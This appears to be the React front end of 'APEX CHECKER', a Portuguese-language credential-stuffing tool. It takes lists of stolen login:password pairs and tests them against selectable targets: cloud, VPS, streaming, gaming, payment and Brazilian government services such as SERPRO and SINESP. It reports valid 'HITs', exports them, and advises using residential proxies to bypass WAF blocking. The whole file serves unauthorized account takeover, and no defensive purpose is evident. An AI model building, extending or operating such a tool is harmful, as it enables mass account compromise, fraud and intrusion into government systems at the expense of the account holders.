import { useState, useRef, useCallback, useEffect } from "react";
import "./index.css";

import imgGithub      from "@assets/IMG_9273_1776631531463.jpeg";
import imgAws         from "@assets/IMG_9280_1776631531463.jpeg";
import imgAmazon      from "@assets/IMG_9275_1776631531463.jpeg";
import imgParamount   from "@assets/IMG_9277_1776631531463.jpeg";
import imgHbo         from "@assets/IMG_9276_1776631531463.jpeg";
import imgDisney      from "@assets/IMG_9274_1776631531463.jpeg";
import imgPaypal      from "@assets/IMG_9272_1776631531463.jpeg";
import imgEpic        from "@assets/IMG_9269_1776631531463.jpeg";
import imgIfood       from "@assets/IMG_9271_1776631531463.jpeg";
import imgSteam       from "@assets/IMG_9270_1776631531463.jpeg";
import imgRoblox      from "@assets/IMG_9268_1776631531463.jpeg";
import imgRiot        from "@assets/IMG_9267_1776631531463.jpeg";
import imgSpotify     from "@assets/IMG_9266_1776631531463.jpeg";
import imgInstagram   from "@assets/IMG_9265_1776631531463.jpeg";
import imgXbox        from "@assets/IMG_9263_1776631531464.jpeg";
import imgCrunchyroll from "@assets/IMG_9264_1776631531464.jpeg";
import imgPlaystation from "@assets/IMG_9262_1776631531464.jpeg";
import imgMercadopago from "@assets/IMG_9279_1776631531463.jpeg";

const API = "";

const TARGETS = [
  { id: "github",       label: "GitHub",       logo: imgGithub,      cat: "Dev/Cloud",    note: "user:PAT",         color: "#24292e" },
  { id: "aws",          label: "AWS IAM",       logo: imgAws,         cat: "Dev/Cloud",    note: "key:secret",       color: "#ff9900" },
  { id: "vultr",        label: "Vultr",         logo: null,           cat: "VPS/Hosting",  note: "API Key",          color: "#007bfc" },
  { id: "hetzner",      label: "Hetzner",       logo: null,           cat: "VPS/Hosting",  note: "API Key",          color: "#d50c2d" },
  { id: "digitalocean", label: "DigitalOcean",  logo: null,           cat: "VPS/Hosting",  note: "API Key",          color: "#0080ff" },
  { id: "linode",       label: "Linode",        logo: null,           cat: "VPS/Hosting",  note: "API Key",          color: "#02b159" },
  { id: "hostinger",    label: "Hostinger",     logo: null,           cat: "VPS/Hosting",  note: "email:pass",       color: "#673de6" },
  { id: "netflix",      label: "Netflix",       logo: null,           cat: "Streaming",    note: "email:pass",       color: "#e50914" },
  { id: "crunchyroll",  label: "Crunchyroll",   logo: imgCrunchyroll, cat: "Streaming",    note: "email:pass",       color: "#f47521" },
  { id: "hbomax",       label: "HBO Max",       logo: imgHbo,         cat: "Streaming",    note: "email:pass",       color: "#6c2bd9" },
  { id: "disney",       label: "Disney+",       logo: imgDisney,      cat: "Streaming",    note: "email:pass",       color: "#003087" },
  { id: "amazon",       label: "Prime Video",   logo: imgAmazon,      cat: "Streaming",    note: "email:pass",       color: "#00a8e0" },
  { id: "paramount",    label: "Paramount+",    logo: imgParamount,   cat: "Streaming",    note: "email:pass",       color: "#0064ff" },
  { id: "spotify",      label: "Spotify",       logo: imgSpotify,     cat: "Streaming",    note: "user:pass",        color: "#1db954" },
  { id: "paypal",       label: "PayPal",        logo: imgPaypal,      cat: "Financeiro",   note: "email:pass",       color: "#003087" },
  { id: "mercadopago",  label: "MercadoPago",   logo: imgMercadopago, cat: "Financeiro",   note: "email:pass",       color: "#00b1ea" },
  { id: "roblox",       label: "Roblox",        logo: imgRoblox,      cat: "Gaming",       note: "user:pass",        color: "#e02020" },
  { id: "steam",        label: "Steam",         logo: imgSteam,       cat: "Gaming",       note: "user:pass",        color: "#1b2838" },
  { id: "epicgames",    label: "Epic Games",    logo: imgEpic,        cat: "Gaming",       note: "email:pass",       color: "#2f2f2f" },
  { id: "playstation",  label: "PlayStation",   logo: imgPlaystation, cat: "Gaming",       note: "email:pass",       color: "#003791" },
  { id: "xbox",         label: "Xbox",          logo: imgXbox,        cat: "Gaming",       note: "email:pass",       color: "#107c10" },
  { id: "riot",         label: "Riot Games",    logo: imgRiot,        cat: "Gaming",       note: "user:pass",        color: "#d0212a" },
  { id: "instagram",    label: "Instagram",     logo: imgInstagram,   cat: "Social",       note: "user:pass",        color: "#e1306c" },
  { id: "ifood",        label: "iFood",         logo: imgIfood,       cat: "Delivery",     note: "email:pass",       color: "#ea1d2c" },
  { id: "serasa",       label: "Serasa",        logo: null,           cat: "Governo BR",   note: "CPF:pass",         color: "#e3000f" },
  { id: "iseek",        label: "iSeek",         logo: null,           cat: "Governo BR",   note: "user:pass",        color: "#1a73e8" },
  { id: "serpro",       label: "SERPRO",        logo: null,           cat: "Governo BR",   note: "user:pass",        color: "#005b9a" },
  { id: "sinesp",       label: "SINESP",        logo: null,           cat: "Governo BR",   note: "user:pass",        color: "#1565c0" },
  { id: "cpf",          label: "CPF/CNPJ",      logo: null,           cat: "Governo BR",   note: "CPF:nascimento",   color: "#4caf50" },
] as const;

type TargetId = (typeof TARGETS)[number]["id"];
const CATS = ["Todos", ...Array.from(new Set(TARGETS.map(t => t.cat)))];

interface ResultItem { credential: string; detail: string; }
interface JobResult  { hits: ResultItem[]; fails: ResultItem[]; errors: ResultItem[]; }

function exportTxt(items: ResultItem[], label: string) {
  const text = items.map(i => `${i.credential} | ${i.detail}`).join("\n");
  const blob = new Blob([text], { type: "text/plain" });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement("a");
  a.href = url; a.download = `${label}.txt`;
  a.click(); URL.revokeObjectURL(url);
}

function parseLines(raw: string): string[] {
  return raw.split(/\r?\n/).map(l => l.trim()).filter(l => l.includes(":") && l.length > 3);
}

function LogoOrFallback({ target }: { target: typeof TARGETS[number] }) {
  if (target.logo) {
    return (
      <img
        src={target.logo}
        alt={target.label}
        className="target-logo-img"
        style={{ background: "transparent" }}
        onError={e => { (e.target as HTMLImageElement).style.display = "none"; }}
      />
    );
  }
  const initials = target.label.slice(0, 2).toUpperCase();
  return (
    <div
      className="target-logo-fallback"
      style={{ background: `${target.color}22`, color: target.color, border: `1px solid ${target.color}44` }}
    >
      {initials}
    </div>
  );
}

export default function App() {
  const [credentials, setCredentials] = useState<string[]>([]);
  const [credInput,   setCredInput]   = useState("");
  const [target,      setTarget]      = useState<TargetId>("disney");
  const [catFilter,   setCatFilter]   = useState("Todos");
  const [dragging,    setDragging]    = useState(false);

  const [running,     setRunning]     = useState(false);
  const [jobId,       setJobId]       = useState<string | null>(null);
  const [total,       setTotal]       = useState(0);
  const [done,        setDone]        = useState(0);
  const [speed,       setSpeed]       = useState(0);
  const [results,     setResults]     = useState<JobResult>({ hits: [], fails: [], errors: [] });
  const [finished,    setFinished]    = useState(false);
  const [resultTab,   setResultTab]   = useState<"hit" | "fail" | "error">("hit");
  const [showSuggestions, setShowSuggestions] = useState(true);

  const esRef      = useRef<EventSource | null>(null);
  const doneRef    = useRef(0);
  const startRef   = useRef(0);
  const speedTimer = useRef<ReturnType<typeof setInterval> | null>(null);

  const visTargets = catFilter === "Todos"
    ? TARGETS
    : TARGETS.filter(t => t.cat === catFilter);

  const handleFile = useCallback((file: File) => {
    const reader = new FileReader();
    reader.onload = e => {
      const text  = e.target?.result as string ?? "";
      const lines = parseLines(text);
      setCredentials(lines);
      setCredInput(`${lines.length} credenciais carregadas de "${file.name}"`);
    };
    reader.readAsText(file);
  }, []);

  const onDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault(); setDragging(false);
    const file = e.dataTransfer.files[0];
    if (file) handleFile(file);
  }, [handleFile]);

  const onPaste = useCallback((raw: string) => {
    const lines = parseLines(raw);
    if (lines.length > 0) { setCredentials(lines); setCredInput(raw); }
    else setCredInput(raw);
  }, []);

  const startCheck = useCallback(async () => {
    const creds = credentials.length > 0 ? credentials : parseLines(credInput);
    if (creds.length === 0) {
      alert("Nenhuma credencial válida encontrada. Use o formato login:senha");
      return;
    }

    setRunning(true);
    setFinished(false);
    setDone(0); doneRef.current = 0;
    setResults({ hits: [], fails: [], errors: [] });
    setResultTab("hit");
    startRef.current = Date.now();
    setShowSuggestions(false);

    speedTimer.current = setInterval(() => {
      const elapsed = (Date.now() - startRef.current) / 1000;
      setSpeed(elapsed > 0 ? Math.round(doneRef.current / elapsed) : 0);
    }, 1000);

    try {
      const r = await fetch(`${API}/api/checker/start`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ credentials: creds, target }),
      });
      if (!r.ok) {
        const err = await r.json().catch(() => ({}));
        throw new Error((err as {error?: string}).error ?? `HTTP ${r.status}`);
      }
      const data = await r.json() as { jobId: string; total: number };
      setJobId(data.jobId);
      setTotal(data.total);

      const es = new EventSource(`${API}/api/checker/${data.jobId}/stream`);
      esRef.current = es;

      es.onmessage = ev => {
        try {
          const d = JSON.parse(ev.data as string) as {
            type: string; status?: string;
            credential?: string; detail?: string;
          };
          if (d.type === "result") {
            doneRef.current++;
            setDone(p => p + 1);
            const item: ResultItem = { credential: d.credential ?? "?", detail: d.detail ?? "" };
            setResults(p => ({
              hits:   d.status === "HIT"   ? [...p.hits,   item] : p.hits,
              fails:  d.status === "FAIL"  ? [...p.fails,  item] : p.fails,
              errors: d.status === "ERROR" ? [...p.errors, item] : p.errors,
            }));
          } else if (d.type === "done" || d.type === "end") {
            es.close(); esRef.current = null;
            setRunning(false); setFinished(true);
            if (speedTimer.current) clearInterval(speedTimer.current);
          }
        } catch { /**/ }
      };

      es.onerror = () => {
        es.close(); esRef.current = null;
        setRunning(false); setFinished(true);
        if (speedTimer.current) clearInterval(speedTimer.current);
      };
    } catch (err) {
      setRunning(false);
      if (speedTimer.current) clearInterval(speedTimer.current);
      alert(`Erro ao iniciar: ${String(err)}`);
    }
  }, [credentials, credInput, target]);

  const stopCheck = useCallback(async () => {
    esRef.current?.close(); esRef.current = null;
    if (speedTimer.current) clearInterval(speedTimer.current);
    if (jobId) await fetch(`${API}/api/checker/${jobId}`, { method: "DELETE" }).catch(() => {});
    setRunning(false); setFinished(true);
  }, [jobId]);

  const reset = useCallback(() => {
    setCredentials([]); setCredInput("");
    setResults({ hits: [], fails: [], errors: [] });
    setFinished(false); setDone(0); setTotal(0);
    setResultTab("hit"); setShowSuggestions(true);
  }, []);

  useEffect(() => () => {
    esRef.current?.close();
    if (speedTimer.current) clearInterval(speedTimer.current);
  }, []);

  const pct     = total > 0 ? Math.round((done / total) * 100) : 0;
  const hitRate = done > 0 ? ((results.hits.length / done) * 100).toFixed(1) : "0.0";
  const currentTarget = TARGETS.find(t => t.id === target);

  return (
    <div className="apex-root">
      <div className="apex-scanline" />

      <header className="apex-header">
        <div className="apex-logo">
          <div className="apex-logo-icon">
            <svg viewBox="0 0 24 24" fill="none" width="18" height="18">
              <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
          <span>APEX</span>
          <span className="apex-logo-sub">CHECKER</span>
        </div>

        <div className="apex-header-center">
          {running && (
            <div className="apex-live-badge">
              <span className="apex-live-dot" />
              LIVE — {speed}/s
            </div>
          )}
        </div>

        <div className="apex-stats-bar">
          <div className="apex-stat-chip apex-stat-chip--hit">
            <svg viewBox="0 0 16 16" fill="currentColor" width="11" height="11"><path d="M13.854 3.646a.5.5 0 010 .708l-7 7a.5.5 0 01-.708 0l-3.5-3.5a.5.5 0 11.708-.708L6.5 10.293l6.646-6.647a.5.5 0 01.708 0z"/></svg>
            <span className="apex-stat-num">{results.hits.length}</span>
            <span className="apex-stat-label">HITs</span>
          </div>
          <div className="apex-stat-chip apex-stat-chip--fail">
            <svg viewBox="0 0 16 16" fill="currentColor" width="11" height="11"><path d="M4.646 4.646a.5.5 0 01.708 0L8 7.293l2.646-2.647a.5.5 0 01.708.708L8.707 8l2.647 2.646a.5.5 0 01-.708.708L8 8.707l-2.646 2.647a.5.5 0 01-.708-.708L7.293 8 4.646 5.354a.5.5 0 010-.708z"/></svg>
            <span className="apex-stat-num">{results.fails.length}</span>
            <span className="apex-stat-label">FAILs</span>
          </div>
          <div className="apex-stat-chip apex-stat-chip--error">
            <svg viewBox="0 0 16 16" fill="currentColor" width="11" height="11"><path d="M8 15A7 7 0 108 1a7 7 0 000 14zm0 1A8 8 0 118 0a8 8 0 010 16z"/><path d="M7.002 11a1 1 0 112 0 1 1 0 01-2 0zM7.1 4.995a.905.905 0 111.8 0l-.35 3.507a.552.552 0 01-1.1 0L7.1 4.995z"/></svg>
            <span className="apex-stat-num">{results.errors.length}</span>
            <span className="apex-stat-label">ERRs</span>
          </div>
          <div className={`apex-status-badge ${running ? "running" : finished ? "done" : "idle"}`}>
            <span className="apex-status-dot" />
            {running ? "CHECANDO" : finished ? "FINALIZADO" : "AGUARDANDO"}
          </div>
        </div>
      </header>

      <main className="apex-main">
        <div className="apex-grid">

          <div className="apex-left">
            <div className="apex-card fade-in">
              <div className="apex-card-header">
                <div className="apex-card-title-group">
                  <span className="apex-card-icon">
                    <svg viewBox="0 0 20 20" fill="currentColor" width="14" height="14"><path d="M9 2a1 1 0 000 2h2a1 1 0 100-2H9zM4 5a2 2 0 012-2 3 3 0 003 3h2a3 3 0 003-3 2 2 0 012 2v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5z"/></svg>
                  </span>
                  <span className="apex-card-title">Credenciais</span>
                </div>
                {credentials.length > 0 && (
                  <span className="apex-badge-count">{credentials.length.toLocaleString("pt-BR")} linhas</span>
                )}
              </div>

              <div
                className={`apex-dropzone ${dragging ? "apex-dropzone--drag" : ""}`}
                onDragOver={e => { e.preventDefault(); setDragging(true); }}
                onDragLeave={() => setDragging(false)}
                onDrop={onDrop}
              >
                <div className="apex-dropzone-content">
                  <div className="apex-dropzone-icon">
                    <svg viewBox="0 0 24 24" fill="none" width="32" height="32" stroke="currentColor" strokeWidth="1.5">
                      <path d="M3 16.5v2.25A2.25 2.25 0 005.25 21h13.5A2.25 2.25 0 0021 18.75V16.5m-13.5-9L12 3m0 0l4.5 4.5M12 3v13.5"/>
                    </svg>
                  </div>
                  <div className="apex-dropzone-text">
                    <strong>Arraste um arquivo</strong> ou clique para selecionar
                    <span className="apex-dropzone-hint">.txt · .csv · .log · uma credencial por linha</span>
                  </div>
                </div>
                <input
                  type="file"
                  accept=".txt,.csv,.log,text/plain"
                  onChange={e => { const f = e.target.files?.[0]; if (f) handleFile(f); }}
                />
              </div>

              <div className="apex-card-section">
                <div className="apex-section-label">ou cole aqui</div>
                <textarea
                  className="apex-textarea"
                  placeholder={"usuario@email.com:senha123\noutro@email.com:outrasenha"}
                  value={credentials.length > 0 ? `✓ ${credentials.length.toLocaleString()} credenciais carregadas` : credInput}
                  onChange={e => {
                    if (!e.target.value.startsWith("✓")) {
                      setCredentials([]);
                      setCredInput(e.target.value);
                      onPaste(e.target.value);
                    }
                  }}
                />
              </div>
            </div>

            <div className="apex-actions fade-in" style={{ animationDelay: ".05s" }}>
              {running ? (
                <button className="apex-btn apex-btn--danger" onClick={stopCheck}>
                  <svg viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><rect x="3" y="3" width="10" height="10" rx="1"/></svg>
                  PARAR
                </button>
              ) : (
                <button
                  className="apex-btn apex-btn--primary"
                  disabled={credentials.length === 0 && parseLines(credInput).length === 0}
                  onClick={startCheck}
                >
                  <svg viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path d="M11.596 8.697l-6.363 3.692c-.54.313-1.233-.066-1.233-.697V4.308c0-.63.692-1.01 1.233-.696l6.363 3.692a.802.802 0 010 1.393z"/></svg>
                  INICIAR CHECKER
                </button>
              )}
              <button className="apex-btn apex-btn--ghost" onClick={reset} disabled={running}>
                <svg viewBox="0 0 16 16" fill="currentColor" width="13" height="13"><path d="M8 3a5 5 0 105 5h-1a4 4 0 11-4-4V3z"/><path d="M8.5 1.5A.5.5 0 018 1V.5a.5.5 0 011 0V1a.5.5 0 01-.5.5z"/></svg>
                Reset
              </button>
            </div>

            {(running || finished) && (
              <div className="apex-card apex-card--glow fade-in" style={{ animationDelay: ".1s" }}>
                <div className="apex-progress-wrap">
                  <div className="apex-progress-header">
                    <div className="apex-progress-stats">
                      <span className="apex-progress-label">
                        Progresso
                      </span>
                      <span className="apex-progress-count">
                        {done.toLocaleString("pt-BR")}<span className="dim">/{total.toLocaleString("pt-BR")}</span>
                      </span>
                    </div>
                    <span className="apex-progress-pct">{pct}%</span>
                  </div>
                  <div className="apex-progress-bar">
                    <div
                      className={`apex-progress-fill ${running ? "shimmer" : ""}`}
                      style={{ width: `${pct}%` }}
                    />
                  </div>
                  <div className="apex-progress-meta">
                    {running && <span className="apex-speed-badge">⚡ {speed} creds/s</span>}
                    {finished && (
                      <span className="apex-hit-rate">
                        Taxa HIT: <strong style={{ color: "var(--green)" }}>{hitRate}%</strong>
                      </span>
                    )}
                    {finished && <span className="apex-done-badge">✓ FINALIZADO</span>}
                  </div>
                </div>
              </div>
            )}
          </div>

          <div className="apex-right">
            <div className="apex-card fade-in" style={{ animationDelay: ".06s" }}>
              <div className="apex-card-header">
                <div className="apex-card-title-group">
                  <span className="apex-card-icon">
                    <svg viewBox="0 0 20 20" fill="currentColor" width="14" height="14"><path fillRule="evenodd" d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd"/></svg>
                  </span>
                  <span className="apex-card-title">Alvo</span>
                </div>
                {currentTarget && (
                  <div className="apex-selected-target">
                    {currentTarget.logo
                      ? <img src={currentTarget.logo} alt="" width="16" height="16" style={{ objectFit: "contain", borderRadius: 3 }} />
                      : <span style={{ fontSize: "1rem" }}>🎯</span>
                    }
                    <span style={{ color: "var(--cyan)", fontSize: ".75rem", fontWeight: 600 }}>
                      {currentTarget.label}
                    </span>
                  </div>
                )}
              </div>

              <div className="apex-cat-tabs">
                {CATS.map(cat => (
                  <button
                    key={cat}
                    className={`apex-cat-tab ${catFilter === cat ? "apex-cat-tab--active" : ""}`}
                    onClick={() => setCatFilter(cat)}
                  >
                    {cat}
                  </button>
                ))}
              </div>

              <div className="apex-targets">
                {visTargets.map((t, i) => (
                  <button
                    key={t.id}
                    className={`apex-target-btn ${target === t.id ? "apex-target-btn--active" : ""}`}
                    onClick={() => setTarget(t.id)}
                    disabled={running}
                    style={{ animationDelay: `${i * 0.02}s` }}
                    title={t.note}
                  >
                    <div className="apex-target-logo">
                      <LogoOrFallback target={t} />
                      {target === t.id && <div className="apex-target-active-ring" />}
                    </div>
                    <span className="apex-target-name">{t.label}</span>
                    <span className="apex-target-note">{t.note}</span>
                  </button>
                ))}
              </div>
            </div>
          </div>
        </div>

        <div className="apex-results-section fade-in" style={{ animationDelay: ".15s" }}>
          <div className="apex-result-tabbar">
            {(["hit", "fail", "error"] as const).map(tab => {
              const cfg = {
                hit:   { label: "HITs",   count: results.hits.length,   icon: "✓", cls: "hit" },
                fail:  { label: "FAILs",  count: results.fails.length,  icon: "✗", cls: "fail" },
                error: { label: "ERRORs", count: results.errors.length, icon: "!", cls: "error" },
              }[tab];
              return (
                <button
                  key={tab}
                  className={`apex-rtab apex-rtab--${cfg.cls} ${resultTab === tab ? "apex-rtab--active" : ""}`}
                  onClick={() => setResultTab(tab)}
                >
                  <span className="apex-rtab-icon">{cfg.icon}</span>
                  {cfg.label}
                  <span className={`apex-rtab-badge apex-rtab-badge--${cfg.cls} ${cfg.count > 0 && resultTab !== tab ? "pulse" : ""}`}>
                    {cfg.count.toLocaleString()}
                  </span>
                </button>
              );
            })}
          </div>

          <div className="apex-result-panel">
            {resultTab === "hit"   && <ResultList type="hit"   items={results.hits}   onExport={() => exportTxt(results.hits,   `hits_${target}`)} />}
            {resultTab === "fail"  && <ResultList type="fail"  items={results.fails}  onExport={() => exportTxt(results.fails,  `fails_${target}`)} />}
            {resultTab === "error" && <ResultList type="error" items={results.errors} onExport={() => exportTxt(results.errors, `errors_${target}`)} />}
          </div>
        </div>

        {showSuggestions && (
          <div className="apex-suggestions fade-in" style={{ animationDelay: ".2s" }}>
            <div className="apex-suggestions-header">
              <span className="apex-suggestions-title">
                <svg viewBox="0 0 20 20" fill="currentColor" width="14" height="14"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd"/></svg>
                Sugestões & Dicas
              </span>
              <button className="apex-suggestions-close" onClick={() => setShowSuggestions(false)}>✕</button>
            </div>
            <div className="apex-suggestions-grid">
              <div className="apex-tip">
                <div className="apex-tip-icon" style={{ color: "#10b981" }}>⚡</div>
                <div>
                  <strong>Formato correto</strong>
                  <p>Use <code>email@exemplo.com:senha123</code> — uma credencial por linha. O checker também aceita <code>user:pass</code> para serviços que usam username.</p>
                </div>
              </div>
              <div className="apex-tip">
                <div className="apex-tip-icon" style={{ color: "#00d4ff" }}>🎯</div>
                <div>
                  <strong>Melhor taxa de hit</strong>
                  <p>Streaming e Gaming costumam ter as melhores taxas. Configure um proxy residencial para contornar bloqueios de WAF no Crunchyroll e HBO Max.</p>
                </div>
              </div>
              <div className="apex-tip">
                <div className="apex-tip-icon" style={{ color: "#f59e0b" }}>📊</div>
                <div>
                  <strong>Export de resultados</strong>
                  <p>Após a verificação, exporte HITs, FAILs e ERRORs separadamente em .txt. Use a aba correspondente para filtrar e baixar.</p>
                </div>
              </div>
              <div className="apex-tip">
                <div className="apex-tip-icon" style={{ color: "#7c3aed" }}>🆕</div>
                <div>
                  <strong>Xbox agora disponível!</strong>
                  <p>Novo checker para Xbox Live via Microsoft OAuth2. Retorna gamertag, tier (Gold/GamePass) e assinaturas ativas.</p>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}

function ResultList({
  type, items, onExport
}: { type: "hit"|"fail"|"error"; items: ResultItem[]; onExport: () => void }) {
  const listRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (listRef.current) listRef.current.scrollTop = listRef.current.scrollHeight;
  }, [items.length]);

  const labels = { hit: "acerto", fail: "falha", error: "erro" };

  return (
    <div className={`apex-result-col apex-result-col--${type}`}>
      <div className="apex-result-col-header">
        {items.length > 0 && (
          <button className={`apex-export-btn apex-export-btn--${type}`} onClick={onExport}>
            <svg viewBox="0 0 16 16" fill="currentColor" width="12" height="12"><path d="M.5 9.9a.5.5 0 01.5.5v2.5a1 1 0 001 1h12a1 1 0 001-1v-2.5a.5.5 0 011 0v2.5a2 2 0 01-2 2H2a2 2 0 01-2-2v-2.5a.5.5 0 01.5-.5z"/><path d="M7.646 11.854a.5.5 0 00.708 0l3-3a.5.5 0 00-.708-.708L8.5 10.293V1.5a.5.5 0 00-1 0v8.793L5.354 8.146a.5.5 0 10-.708.708l3 3z"/></svg>
            Exportar {items.length.toLocaleString()}
          </button>
        )}
      </div>
      <div className="apex-result-list" ref={listRef}>
        {items.length === 0 ? (
          <div className="apex-result-empty">
            <span>Nenhum {labels[type]} ainda</span>
          </div>
        ) : (
          items.map((item, i) => (
            <div key={i} className={`apex-result-item apex-result-item--${type} slide-in`} style={{ animationDelay: `${Math.min(i * 0.03, 0.3)}s` }}>
              <div className="apex-result-cred">{item.credential}</div>
              {item.detail && <div className="apex-result-detail">{item.detail}</div>}
            </div>
          ))
        )}
      </div>
    </div>
  );
}
